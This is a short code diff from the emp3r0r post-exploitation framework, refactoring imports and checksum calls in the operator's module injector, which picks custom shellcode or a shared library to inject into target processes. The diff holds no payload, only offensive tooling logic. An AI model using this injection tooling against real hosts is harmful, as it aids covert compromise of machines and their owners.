@@ -5,10 +5,10 @@ import (
 
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
 	"github.com/jm33-m0/emp3r0r/core/internal/emp3r0r_def"
-	"github.com/jm33-m0/emp3r0r/core/internal/logging"
 	"github.com/jm33-m0/emp3r0r/core/internal/runtime_def"
-	"github.com/jm33-m0/emp3r0r/core/internal/tun"
-	"github.com/jm33-m0/emp3r0r/core/internal/util"
+	"github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_crypto"
+	"github.com/jm33-m0/emp3r0r/core/lib/logging"
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
 func moduleInjector() {
@@ -33,14 +33,14 @@ func moduleInjector() {
 	if method == "shellcode" && !util.IsExist(runtime_def.WWWRoot+shellcode_file) {
 		logging.Warningf("Custom shellcode '%s%s' does not exist, will inject guardian shellcode", runtime_def.WWWRoot, shellcode_file)
 	} else {
-		checksum = tun.SHA256SumFile(runtime_def.WWWRoot + shellcode_file)
+		checksum = emp3r0r_crypto.SHA256SumFile(runtime_def.WWWRoot + shellcode_file)
 	}
 
 	// to_inject.so
 	if method == "shared_library" && !util.IsExist(runtime_def.WWWRoot+so_file) {
 		logging.Warningf("Custom library '%s%s' does not exist, will inject loader.so instead", runtime_def.WWWRoot, so_file)
 	} else {
-		checksum = tun.SHA256SumFile(runtime_def.WWWRoot + so_file)
+		checksum = emp3r0r_crypto.SHA256SumFile(runtime_def.WWWRoot + so_file)
 	}
 
 	// injector cmd
